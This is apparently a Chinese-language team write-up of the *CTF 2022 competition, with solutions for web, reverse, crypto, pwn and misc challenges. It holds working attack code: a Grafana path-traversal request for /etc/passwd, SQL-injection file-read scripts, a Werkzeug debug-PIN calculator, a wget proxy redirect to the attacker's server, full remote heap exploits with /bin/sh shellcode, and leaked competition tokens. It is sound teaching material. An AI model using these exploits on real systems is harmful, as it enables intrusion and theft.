# WEB

## oh-my-grafana 

任意文件读取：

```Groovy
GET /public/plugins/alertlist/../../../../../../../../../../../etc/passwd HTTP/1.1
Host: 124.71.184.1:3000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6
Cookie: redirect_to=%2Ffavicon.ico
Connection: close
```

账号密码：admin  5f989714e132c9b04d4807dafeb10ade 

```Nginx
curl -H "Authorization: Bearer eyJrIjoiWEhKRXI5YWFWVFFNWlRGTTFFNTZidk5ETnh3MVdvcWQiLCJuIjoiYWFhIiwiaWQiOjF9" http://124.71.184.1:3000/api/dashboards/home
```

![img](https://rvu5pcz1il.feishu.cn/space/api/box/stream/download/asynccode/?code=YTQ5ZTM1YjcxMjlkNjQ3YmFmY2EzYTliYTRjMGYwOGNfOUZwdHVHZEVmMVREVU1qVFdXaGZaNXdacGVLZWlVWU5fVG9rZW46Ym94Y25Dajh0SnhkN3N3SWNrYkx2WmV4aTlmXzE2NTAyMDkxMjA6MTY1MDIxMjcyMF9WNA)

链接上去，后台datasource,链接MySQL，flag在数据库里面

## oh-my-notepro 

https://blog.csdn.net/weixin_54648419/article/details/123632203 和mysql5.6的版本，load local file

```C%23
import requests,random
session = requests.Session()
table_name  = "".join(random.sample('zyxwvutsrqponmlkjihgfedcba',5))
file = '/sys/class/net/eth0/address'
file = '/etc/machine-id'
file='/proc/self/cgroup'
payload1 = f'''1';create table {table_name}(name varchar(30000));load data  local infile "{file}" into table ctf.{table_name} FIELDS TERMINATED BY '\n';#'''
payload2 = f'''1' union select 1,2,3,4,(select GROUP_CONCAT(NAME) from ctf.{table_name})#'''
paramsGet1 = {"note_id":payload1}
paramsGet2 = {"note_id":payload2}
headers = {"Cache-Control":"max-age=0","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36","Connection":"close","Accept-Encoding":"gzip, deflate","Accept-Language":"zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6"}
cookies = {"session":"eyJjc3JmX3Rva2VuIjoiNjU5MmViODdhMjgwOGE4OTY0ZTRjMmU1Y2RlMWIxNGNiODM4MmNiNSIsInVzZXJuYW1lIjoiYWFhIn0.YlpeQg.VAhhSpogG4OT1bAytxIdRvyCxYk"}

response1 = session.get("http://121.37.153.47:5002/view", params=paramsGet1, headers=headers, cookies=cookies)
response2 = session.get("http://121.37.153.47:5002/view", params=paramsGet2, headers=headers, cookies=cookies)
print(response2.text)
```

上面这样就可以读到3个要的文件。python3.8

```Python
#sha1
import hashlib
from itertools import chain
probably_public_bits = [
    'ctf'# /etc/passwd
    'flask.app',# 默认值
    'Flask',# 默认值
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # 报错得到
]

private_bits = [
    '2485723369475',#  /sys/class/net/eth0/address 16进制转10进制
    #machine_id由三个合并(docker就1,3)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup
    '1cc402dd0e11d5ae18db04a6de87223d5a46d823f27edfa2c6c973c7e80fd24731bd56fc969e13f96e1868aa82dcde32'#  /proc/self/cgroup
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

## oh-my-lotto 

有环境变量，设置PATH=/TMP,os.system()就会找不到wget，就不会新生成预测结果，然后我们看一眼result，直接上传就可以了。

## oh-my-lotto-revenge 

思路：

使用wgetrc，设置保存文件的名字和wget的代理，代理设置为自己的vps，然后保存文件设置为index.html,写入模板语言。

```JavaScript
output_document=/app/templates/index.html
http_proxy=
```

 export WGETRC=/app/guess/forecast.txt 

index.html

```JavaScript
 export WGETRC=/app/guess/forecast.txt 
```

# Reverse

## Simple File System

本题实现了一个小的文件系统，分析函数行为，可以得知整个image的第一个块是超级块，记录了文件系统的块总数（500），inode块总数（50），inode总数（6400），还有魔数 0xDEADBEEF。

image 的组成如下图所示：

![img](https://rvu5pcz1il.feishu.cn/space/api/box/stream/download/asynccode/?code=MGM5OTlkMDk4MjhlODc5NGVmMWFlMjYyMDdmMjI4M2VfUlBIcjZKT1p1ckVRVk95Zkx1QjFtdlhwMVREZG95VW9fVG9rZW46Ym94Y25CT3dXQkFBVWt3ME51dEFHeVhkTW5jXzE2NTAyMDkxMjA6MTY1MDIxMjcyMF9WNA)

inode 块从第二个块开始，往后 50 个，所以第一个数据块是从 51 * 0x1000 = 0x33000 开始的。它的 inode 和 block 位图都是用 calloc 申请的，没记录在 image 里。

inode 的结构体如下：

```C
struct inode {
    DWORD inuse;      // 是否使用
    DWORD i_size;     // 文件大小
    DWORD i_zone[5];  // 直接块号
    DWORD indirect;   // 一次间接块号
}
```

根据 plantflag 的行为，可以得知该函数拷贝了很多次 flag 内容到文件系统里

![img](https://rvu5pcz1il.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDhjMWVlNWY1YmRiZmFiMmM0Yjc4YmI4ZWU5MDQ0NmZfaVp5ZmdJeEtrRlZWcGpvUXlUTldQaUZ6SjZZSW0ySUhfVG9rZW46Ym94Y25OYnIxYmswN2E3em5rODI5VjIxQjhjXzE2NTAyMDkxMjA6MTY1MDIxMjcyMF9WNA)

但是只有当 copy_to_fs 的第三个参数为 1 时，所用的加密方式才是可逆的：

![img](https://rvu5pcz1il.feishu.cn/space/api/box/stream/download/asynccode/?code=NDU2NTZjYzJlZjgwYTEzMTNmMDIzZDI4OTFkNDI5NmVfcWpPd1cwbURZdlZ6clNwdjFsS0ZaYjI0RzZBRlJnellfVG9rZW46Ym94Y254ZGZNRmRqMUVmbjdxVFdBSHZ6MmViXzE2NTAyMDkxMjA6MTY1MDIxMjcyMF9WNA)

解题脚本：

```Python
from struct import unpack


def decrypt(cipher):
    plain = []
    cipher = list(cipher)
    for i in range(31):
        cipher[i] = (cipher[i]>>3) | (cipher[i]<<5) & 0xff
        cipher[i] ^= 0xde
        cipher[i] = (cipher[i]>>4) | (cipher[i]<<4) & 0xff
        cipher[i] ^= 0xed
        cipher[i] = (cipher[i]>>5) | (cipher[i]<<3) & 0xff
        cipher[i] ^= 0xbe
        cipher[i] = (cipher[i]>>6) | (cipher[i]<<2) & 0xff
        cipher[i] ^= 0xef
        cipher[i] = (cipher[i]>>7) | (cipher[i]<<1) & 0xff
        plain.append(cipher[i])
    return bytes(plain)


with open("image.flag", "rb") as f:
        idx = 0
        while True:
                f.seek(0x1000 + idx * 0x20)
                inode = f.read(0x20)
                inuse, size, izone0 = unpack("<3I", inode[:12])
                if not inuse:
                        break

                f.seek(izone0 << 12)
                plain = decrypt(f.read(size))
                if b"*CTF" in plain:
                        print(plain.decode())
                        break
                idx += 1
```

## NaCl 

这题把 F5 踩地上摩擦了，跟着调可以发现程序先初始化了一个数组，然后接收 32 个字符的输入，分成 4 组。每组高低 4 字节经过一个大小端转换，过一个加密：

```Python
tbl = [67438087, 66051, 202182159, 134810123, 3443517467, 3619968119, 2671678006, 17297799, 4187212673, 3212056172, 3659105319, 436579327, 2466768356, 3414888005, 812513269, 2905604503, 2860953686, 1150444474, 1067728923, 507640087, 3335200381, 418057594, 3572254720, 3028744491, 2268592627, 1985887525, 3678221623, 3997455659, 298895692, 2606783435, 2419824819, 616754851, 2305691810, 575140032, 3092143274, 2368472304, 1002931244, 441505286, 1235325308, 2115810572, 4230461478, 1608376252, 3725575172, 2998077703]

def rol(s, i):
    tmp = bin(s)[2: ].rjust(32, '0')
    return int(tmp[i:] + tmp[:i], 2) & 0xFFFFFFFF

low4 = 0x30313233
high4 = 0x34353637

# 加密
for i in range(0x2C):
    tmp = low4
    low4 = (rol(low4, 1) & rol(low4, 8)) ^ rol(low4, 2) ^ tbl[i] ^ high4
    high4 = tmp

# 对应的解密
for i in range(0x2B, -1, -1):
    tmp = high4
    high4 = (rol(tmp, 1) & rol(tmp, 8)) ^ rol(tmp, 2) ^ tbl[i] ^ low4
    low4 = tmp
```

这一组再过一个 xtea，轮数是 (1 << 当前第几组)，轮加的数是 0x10325476。接着一样的方式处理下一组，反着解回去就行了。

## Jump 

考点是 setjmp 和 longjmp 配合的跳转，实际算法不难，输入循环左移 35 次得到 35 个字符串 然后升序排列，顺序取每个字符串最后一个字符拼起来要等于目标数组。

```Python
a = "\x03jmGn_=uaSZLvN4wFxE6R+p\x02D2qV1CBTck"
b = ''.join(sorted(a))

ch = '\x02'
ans = ch
while len(ans) != 34:
    _id = b.index(ch)
    ans = a[_id] + ans
    ch = a[_id]
print(ans)
```



# Crypto

## ezRSA

由题意知q及约等于p异或2^900-1异或一个300位的随机数，设$$p=p_{high}+p_{low}$$,$$q=q_{high}+q_{low}$$，其中high指高124位，low指低900位，设$$p_{high}=x$$，易知$$q_{high}=x$$，且由异或的性质知道$$p_{low}+q_{low}=2^{900}-1+c1$$，其中c1为300位的随机数，那么$$n=pq=(p_{high}*2^{900}+p_{low})(q_{high}*2^{900}+q_{low})=2^{1800}x^2+2^{900}x(p_{low}+q_{low})+p_{low}q_{low}=2^{1800}x^2+2^{1800}x+small$$因此，将n//2**1800，得到的就是$$x^2+x$$，解得x，也即高位，然后求中间的300-900位，由异或的性质知p,q的300-900位相加等于一个定值，且每一位有且仅有一个数在这个位上为1和0，由均值不等式，在p,q之和固定时，p,q相差越大，所得的乘积n就会越小，因此我们先把所有的1都给p，0全给q，

然后根据乘积的大小，从高位开始去选择1的去向，求得大概的p值后，还不准确，需要爆破p的准确预测数，coppersmith求出p，解得flag

```Python
#sage
from gmpy2 import *
from Crypto.Util.number import *

def solve(a,b,c):
    delta=b*b-4*a*c
    if delta<0:
        return (0,0)
    delta=isqrt(delta)
    if (-b+delta)%(2*a)!=0 or (-b-delta)%(2*a)!=0:
        return (0,0)
    return ((-b+delta)//(2*a),(-b-delta)//(2*a))

n=0xe78ab40c343d4985c1de167e80ba2657c7ee8c2e26d88e0026b68fe400224a3bd7e2a7103c3b01ea4d171f5cf68c8f00a64304630e07341cde0bc74ef5c88dcbb9822765df53182e3f57153b5f93ff857d496c6561c3ddbe0ce6ff64ba11d4edfc18a0350c3d0e1f8bd11b3560a111d3a3178ed4a28579c4f1e0dc17cb02c3ac38a66a230ba9a2f741f9168641c8ce28a3a8c33d523553864f014752a04737e555213f253a72f158893f80e631de2f55d1d0b2b654fc7fa4d5b3d95617e8253573967de68f6178f78bb7c4788a3a1e9778cbfc7c7fa8beffe24276b9ad85b11eed01b872b74cdc44959059c67c18b0b7a1d57512319a5e84a9a0735fa536f1b3
e=65537
c=0xd7f6c90512bc9494370c3955ff3136bb245a6d1095e43d8636f66f11db525f2063b14b2a4363a96e6eb1bea1e9b2cc62b0cae7659f18f2b8e41fca557281a1e859e8e6b35bd114655b6bf5e454753653309a794fa52ff2e79433ca4bbeb1ab9a78ec49f49ebee2636abd9dd9b80306ae1b87a86c8012211bda88e6e14c58805feb6721a01481d1a7031eb3333375a81858ff3b58d8837c188ffcb982a631e1a7a603b947a6984bd78516c71cfc737aaba479688d56df2c0952deaf496a4eb3f603a46a90efbe9e82a6aef8cfb23e5fcb938c9049b227b7f15c878bd99b61b6c56db7dfff43cd457429d5dcdb5fe314f1cdf317d0c5202bad6a9770076e9b25b1
p_high=solve(1,1,-n//2^1800)[0]
p=(p_high<<900)+((1<<900)-1)^^((1<<300)-1)
q=p_high<<900
for i in range(898,299,-1):
        bit=1<<i
        if (p^^bit)*(q^^bit)<n:
                p^^=bit
                q^^=bit


Zmod=Zmod(n)
P.<x>=PolynomialRing(Zmod)
for i in range(300,500):
    f=x+ZZ(((p>>i)<<i))
    root=f.small_roots(X=2^i,beta=0.4)
    if root!=[]:
        p=root[0]+ZZ(((p>>i)<<i))
        break

q=ZZ(n)//ZZ(p)
phi=ZZ((p-1)*(q-1))
d=invert(e,phi)
flag=long_to_bytes(ZZ(pow(c,d,n)))
print(flag)

#flag:b'*CTF{St.Diana_pls_take_me_with_you!}'
```

## InverseProblem2

和上次SUS的那题差不多，不用管getQ里面矩阵的QR分解和生成A里面的logspace,linspace,只需要知道A每一行的前四十列数字很大，后十行很小就足够了，还是$$Ax-s=b$$，这里由于习惯问题转置一下变成$$x^TA^T-s^T=b^T$$，移项得$$x^TA^T-b^T=s^T$$，注意到对应flag部分的数都很大，对应padding的部分数都很小，所以将padding部分的矩阵乘法当作s误差向量，但是由于是小数，所以我们需要乘一个倍数变到整数上讨论（大概是10的15次方左右），同时扩大A或者x，但是这里扩大A比较好，所以构造格子如下:[[k1A,k2E],[k1b,0]]，其中A是40*40的矩阵（原来A文件里面的前四十行的前四十列），E是40*1的全1矩阵,b是1*40的矩阵（原来b文件里面的前四十个），k1，k2参数调一下分别用10^15和10^20，用BKZ算法归约乘逆之后第一行便是flag。

```Python
#sage
with open("A.txt",'r') as f:
    data=f.read()
with open("b.txt",'r') as f:
    data1=f.read()
data=data.split('\n')
Data=[]
for i in data:
    tmp=i.split()
    for j in range(len(tmp)):
        tmp[j]=eval(tmp[j])
    Data.append(tmp)
Data=Data[:-1]

data1=data1.split('\n')[:-1]
Data1=[int(eval(i)) for i in data1]

Data=matrix(Data)
Data=Data.transpose()
M=matrix(41,41)
for i in range(40):
    for j in range(40):
        M[i,j]=int(Data[i,j])*10**15
for i in range(40):
    M[40,i]=Data1[i]*10**15
    M[i,40]=10**20
M[40,40]=0
x=M.BKZ(block_size=20)
res=(x*M**-1)[0]
RES=''
for i in res:
    RES+=chr(abs(i))
print(RES)
#flag:*CTF{Y0u_s01v3_m1xed_Integer_LS_pr0b1em}
```

# PWN

## examination

利用check review泄漏heap地址，同时增加comment的size造成堆溢出。溢出之后把header改为0x421，free掉之后即可获得libc地址。最后再利用comment写free hook即可。

```Python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
from PwnContext import *

context.terminal = ['tmux', 'splitw', '-h', '-p70']
#-----function for quick script-----#
s       = lambda data               :ctx.send(str(data))        #in case that data is a int
sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
sl      = lambda data               :ctx.sendline(str(data)) 
sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :ctx.recv(numb)
ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
irt     = lambda                    :ctx.interactive()

lg                 = lambda s                                        :log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32    = lambda data                           :u32(data.ljust(4, '\0'))
uu64    = lambda data                           :u64(data.ljust(8, '\0'))
getLeak = lambda                                        :uu64(ru('\x7f',drop=False)[-6:])

debugg = 0
logg = 0

ctx.binary = './examination'

ctx.custom_lib_dir = './glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/'#remote libc
ctx.debug_remote_libc = True

ctx.symbols = {'note':0x5080}
ctx.breakpoints = [0x1e12]
#ctx.debug()
#ctx.start("gdb",gdbscript="set follow-fork-mode child\nc")

if debugg:
        rs()
else:
        ctx.remote = ('124.70.130.92', 60001)
        rs(method = 'remote')

if logg:
        context.log_level = 'debug'

def choice(aid):
        sa('choice>> ',aid)
def add_student(ques_num):
        choice(1)
        sla('questions: ',ques_num)
def change_role(aid):
        choice(5)
        sla('>: ',aid)
def change_id(aid):
        choice(6)
        sla('id: ',aid)
def check_review():
        choice(2)
def xor_lazy():
        choice(3)
def give_score():
        choice(2)
def set_mode(amode):
        choice(4)
        s(amode)
def remove_studen(aid):
        choice(4)
        sa('choose?',aid)

def write_comment(aid,comment,has_comment=True,comment_size=None):
        choice(3)
        sla('one? > ',aid)
        if not has_comment:
                sla('comment: ',comment_size)
        sa('comment:',comment)

sla('>: ',0)
add_student(1)#0
write_comment(0,'AAA',has_comment=False,comment_size=0x48)
add_student(1)#1
write_comment(1,'BBB',has_comment=False,comment_size=0x48)
change_role(1)
change_id(0)
xor_lazy()
change_id(1)
xor_lazy()
change_role(0)
give_score()

add_student(2)#2
write_comment(2,'222',has_comment=False,comment_size=0x38)
add_student(3)#3
add_student(4)#4
write_comment(4,'\x00'*0x248+p64(0x21)+p64(0)*3+p64(0x21),has_comment=False,comment_size=0x3ff)
add_student(5)#5
add_student(6)#6

change_role(1)
change_id(0)
check_review()
ru('reward! ')
heap = int(ru('\n'),16) - 0x10
lg('heap')
sla('addr: ',str(heap+0x50)+'a')
change_id(1)
check_review()
sla('addr: ',str(heap+0x50)+'a')

change_role(0)
write_comment(0,'A'*0x48+p16(0x421))
remove_studen(1)
payload = '\x00'*0x90
payload += p64(0)+p64(0x31)+p64(heap+0x180)+'\x00'*0x18
payload += p64(0)+p64(0x21)+p64(2)+p64(heap+0x1a0)+p64(0x10)
write_comment(6,payload,has_comment=False,comment_size=0xe8)
change_role(1)
change_id(2)
check_review()
libc_base = getLeak() - 0x1ecbe0
lg('libc_base')
libc = ctx.libc
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

change_role(0)
payload = '\x00'*0x30
payload += p64(0)+p64(0x31)+p64(heap+0x210)+'\x00'*0x18
payload += p64(0)+p64(0x21)+p64(2)+p64(free_hook-8)+p64(0x10)
write_comment(5,payload,has_comment=False,comment_size=len(payload))
write_comment(3,'/bin/sh;'+p64(system))
remove_studen(3)

#ctx.debug()
irt()
        
```

##  babynote  :

Musl 1.2.2 free最后一个堆块得时候pre->chunk指针没有清除，利用数据残留构造成环，然后泄露地址，伪造meta queue，之后改malloc_replare 打stdin

```Apache
# _*_ coding:utf-8 _*_
from pwn import *
context.log_level = 'debug'
context.terminal=['tmux', 'splitw', '-h']
prog = './babynote'
#elf = ELF(prog)#nc 121.36.194.21 49155
# p = process(prog,env={"LD_PRELOAD":"./libc.so"})
# libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
p = remote("123.60.76.240", 60001)#nc 124.71.130.185 49155
def debug(addr,PIE=True): 
    debug_str = ""
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
        for i in addr:
            debug_str+='b *{}\n'.format(hex(text_base+i))
        gdb.attach(p,debug_str) 
    else:
        for i in addr:
            debug_str+='b *{}\n'.format(hex(i))
        gdb.attach(p,debug_str) 

def dbg():
    gdb.attach(p)
#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(str(delim), str(data)) 
sl      = lambda data               :p.sendline(str(data)) 
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
it      = lambda                    :p.interactive()
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))
bp      = lambda bkp                :pdbg.bp(bkp)
li      = lambda str1,data1         :log.success(str1+'========>'+hex(data1))

    
def dbgc(addr):
    gdb.attach(p,"b*" + hex(addr) +"\n c")

def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

def choice(idx):
    sla("option: ",str(idx))

def add(sz,con,sz1,note):
    choice(1)
    # sla("Index: ",idx)
    sla("name size: ",sz)
    sla("name: ",con)
    sla("note size: ",sz1)
    sla("note content: ",note)  
    # sa("content?",cno)
def add1(sz,con,sz1,note):
    choice(1)
    # sla("Index: ",idx)
    sleep(0.1)
    sl(sz)
    sleep(0.1)

    sl(con)
    sleep(0.1)

    sl(sz1)
    sleep(0.1)

    sl(note)    
    sleep(0.1)

    # sa("content?",cno)
def delete(sz,con):
    choice(3)
    sla("name size: ",sz)
    sla("name: ",con)

def show(sz,con):
    choice(2)
    sla("name size: ",sz)
    sla("name: ",con)

def forge():
    choice(4)






def exp():
    #debug([0x7B9])


    add(0x28,'0'*1,0x28,'0'*0x27)
    add(0x28,'1'*1,0x28,'1'*0x27)
    add(0x28,'2'*1,0x28,'2'*0x27)
    add(0x1540,'x',0x1540,'h'*0x27)


    delete(0x60,'0')
    add(0x80,'0'*1,0x28,'0'*8)

    delete(0x60,'0')

    delete(0x60,'x')

    add(0x1540,'3',0x1f,'3'*0x1e)
    add(0x1540,'4',0x80,'3'*0x1e)
    delete(0x60,4)
    add(0x60,'5'*1,0x28,'2'*0x27)
    delete(0x60,'5')
    add(0x1540,'6'+'\x00'*0xf+'99',0x1540,'7'*8)
    show(0x60,'5')
    ru('0x27:')


    i1 = int(r(2),16)
    i2 = int(r(2),16)
    i3 = int(r(2),16)
    i4 = int(r(2),16)
    i5 = int(r(2),16)
    i6 = int(r(2),16)
    data = i6 * 0x10000000000 + i5*0x100000000 + i4 * 0x1000000
    data +=i3 * 0x10000 + i2*0x100+i1

    lg('data',data)
    addr = data - 0x7eff9ec45060 + 0x7eff9ec49000
    mal_cont = data + 0x7eff9ecfdac0 - 0x7eff9ec45060
    lg('addr',addr)
    lg('mal_cont',mal_cont)

    r(60-6)
    i2 = int(r(2),16)
    i3 = int(r(2),16)
    i4 = int(r(2),16)
    i5 = int(r(2),16)
    i6 = int(r(2),16)
    base20 = i6 * 0x10000000000 + i5*0x100000000 + i4 * 0x1000000
    base20 +=i3 * 0x10000 + i2*0x100+0xc0      
    lg('base20',base20)  
    #---------------------------------------
    # add(0x800,'7',0x800,'7')#pad
    delete(0x60,'3')
    delete(0x60,'2')
    
    # add(0x60,'3',0x20,'3'*8)
    pay = 0x20*'x'+p64(base20+0xc0)[:6]
    add(0x60,'pad1',0x28,pay)
    fake_control = p64(base20+0xc0)+p64(mal_cont)+p64(1)+p64(8)+p64(base20-0x60)[:6]
    add(0x60,'3',0x28,fake_control)
    show(0x60,'\x80')
    ru('0x8:')
    i1 = int(r(2),16)     
    i2 = int(r(2),16)
    i3 = int(r(2),16)
    i4 = int(r(2),16)
    i5 = int(r(2),16)
    i6 = int(r(2),16)    
    i7 = int(r(2),16)    
    i8 = int(r(2),16)    
    secret = i6 * 0x10000000000 + i5*0x100000000 + i4 * 0x1000000
    secret+= i3 * 0x10000 + i2*0x100+i1  
    secret+= i7 * 0x1000000000000 + i8*0x100000000000000
    lg('secret',secret)

    stdout = addr - 0x7f80c8380000  + 0x7f80c8434280  
    #----------------------------------------------attact
    delete(0x60,'pad1')
    delete(0x60,'3')
    delete(0x60,'1')
    sizeclass = 10
    pay = p64(base20-0x60)*2+p64(1)+p64(8)+p64(base20+0x60)[:6]
    add(0x1f,'10',0x28,pay)

    off = 0x3050

    fake_meta = ''
    fake_meta = fake_meta.ljust(0x1000-0x10-0x80,'a')
    fake_meta+= p64(data+off+0x10-0x80)[:8]+p64(0)
    fake_meta+= p64(secret)+p64(0)*7+p64(0)+p64(0)
    fake_meta+= p64(data+off-0x70+0x240)+p64(0)+p64((sizeclass << 6) + 1)

    fake_meta = fake_meta.ljust(0x1200,'\x00')
    fake_meta+= (p64(data+off-0x80+0x20-0x10)+p64(0))*2




    add(0x60,'12',0x1540,fake_meta)
    fake_meta_ptr = p64(data+off-0x80+0x20+0x240)+p64(0)+p64(1)
    add(0x60,'11',0x1e,fake_meta_ptr)
    add(0x60,'13',0x1540,fake_meta)

    

    # debug([0x177C])
    delete(0x60,p8((0x40)&0xff))
    #------------------------------------------------
    delete(0x60,'12')
    malloc_replaced = addr + 0xB6F84
    fake_meta = ''
    fake_meta = fake_meta.ljust(0x1000-0x10-0x80-0x20,'a')
    fake_meta+= p64(data+off+0x10-0x80)[:8]+p64(0)
    fake_meta+= p64(secret)+p64(0)*7+p64(0)+p64(0)
    fake_meta+= p64(malloc_replaced-0x10+4)+p64(1)+p64((1 << 6) + 1)
    add(0x60,'12',0x1540,fake_meta)
    # dbg()
    # raw_input()
    add(0x60,'14',0xa0,'\x00')
    #-----------------------------------------------
    delete(0x60,'12')
    stdin = addr - 0x7f40cbab5000+0x7f40cbb69180
    fake_meta = ''
    fake_meta = fake_meta.ljust(0x1000-0x10-0x80-0x20-0x10,'a')
    fake_meta+= p64(data+off+0x10-0x80)[:8]+p64(0)
    fake_meta+= p64(secret)+p64(0)*7+p64(0)+p64(0)
    fake_meta+= p64(stdin - 0xd0)+p64(1)+p64((9 << 6) | 1)+'a'*0x18+p64(stdout-0x10)
    add(0x60,'12',0x1540,fake_meta)
    sys = addr + 0x7fb07eedda90 - 0x7fb07ee8d000
    # fakesttdout = "/bin/sh\x00"+"A"*0x20+p64(base20+1)+'a'*8+p64(base20)+'a'*8+p64(sys)
    fakesttdout = 0x20*'\x00'+"/bin/sh\x00"+"A"*0x20+p64(base20+2)+'a'*8+p64(base20+1)+'a'*8+p64(sys)
    
    # dbg()
    # delete(0x60,'x')
    # delete(0x60,'3')
    # delete(0x60,'4')
    # delete(0x60,'6')
    # raw_input()
    add1(0x60,'fakesttdout',0xa0,fakesttdout)

    # debug([0x18C3])
    sleep(0.1)
    sl('5')
    it()
if __name__ == '__main__':
    exp()
```



# Misc

## babyFL 

先看源码，大致意思是向平台输入参数，然后与平台里的二十组模型的权值进行求平均运算得到一个新的模型，在test这个模型，但是test数据是标签被更改过的错误数据，要求用错误数据测试的准确率大于0.95才可以的到flag。

思路：自己用争取训练集训练一个模型，再用错误数据训练一个模型，之后通过21*(错误数据模型权重)-正确数据模型权重=所要输入的参数，之后输入进平台。

```Python
import os
import traceback

import numpy as np
from tensorflow.keras import Sequential
from tensorflow.keras.layers import  Dense, Conv2D, Flatten, MaxPooling2D
from tensorflow import keras

from tensorflow.keras.models import load_model
from tensorflow.keras.datasets import mnist

participant_number = 20



def new_model():
    model = Sequential()
    model.add(Conv2D(10, (3, 3), input_shape=(28, 28, 1)))
    model.add(MaxPooling2D(pool_size=(2, 2)))
    model.add(Conv2D(20, (3, 3)))
    model.add(Flatten())
    model.add(Dense(units=100, activation='relu'))
    model.add(Dense(units=10, activation='softmax'))
    model.compile(loss=keras.losses.SparseCategoricalCrossentropy(), metrics=['accuracy'],
                  optimizer=keras.optimizers.Adam(lr=0.0001))
    return model


def load_test_data():
    (x, y), (_, _) = mnist.load_data()
    l = len(y)
    for i in range(l):
        y[i] = 9 - y[i]
    x = x.reshape(-1, 28, 28, 1)
    return x, y




def train_models():
    x, y = load_test_data()
    x = x.reshape(-1, 28, 28, 1)
    model = new_model()
    model.fit(x, y, batch_size=64, epochs=30)
    #多训了10轮
    model.save("./gpt2/qq/2.h5")



def test(model):
    print('test')
    my_x, my_y = load_test_data()
    loss, acc = model.evaluate(my_x, my_y, batch_size=64)
    print(loss,acc)





if __name__ == '__main__':

        train_models()
        model1 = load_model('./gpt2/qq/2.h5')
        param2 = model1.get_weights()
        model2 = load_model('./gpt2/qq/1.h5')
        #1.h5是用正确数据得到的模型，我是在原代码里改的，这里没配得到1.h5的代码，比较简单，跑一下源代码就行了。
        param1 = model2.get_weights()
        weights = []
        ans = []

        for i in range(len(param2)):
            f = open(str(i)+'.txt', 'a')
            #每层权重存在一个文件里
            layer1 = param1[i]
            layer2 = param2[i]
            sum = 0
            sum = layer2*21-layer1
            weights.append(sum)
            arr = np.array(sum, float)
            arr = arr.ravel()
            for i in range(len(arr)):
                f.write(str(arr[i])+' ')
            print(arr)
            f.write('\n')
            print('-----------------------------------------------------')
        f.close()
        model = new_model()
        l = len(model.get_weights())
        model.set_weights(weights)
```

之后是输入参数的脚本

## Today 

![img](https://rvu5pcz1il.feishu.cn/space/api/box/stream/download/asynccode/?code=OTIyYzE1ZGYyYjE3ZjQ4MWUwYTI5ZGY2OGQwNDBlZTJfSThscFg2WVdpWmFyTEgySXJjUlBZV2xhd29PcGpKSEtfVG9rZW46Ym94Y25YcDB4TGREVllWSTlnbVdSb0I3V21nXzE2NTAyMDkxMjA6MTY1MDIxMjcyMF9WNA)

根据题目意思猜测是社工,由描述可知anninefour loves machine learning and data science,根据此条件进行查找

![img](https://rvu5pcz1il.feishu.cn/space/api/box/stream/download/asynccode/?code=MzhiMDAzNjdmNzZmOTJkZDRiMmViZTBlY2QxZWE2ZjVfUWI3U1NMSjhwakR4djJtTTd4UmlOM0diWlR5VU1rRmFfVG9rZW46Ym94Y25HSlBUN1pETVF1eXE4RDd6SDlUWk9iXzE2NTAyMDkxMjA6MTY1MDIxMjcyMF9WNA)

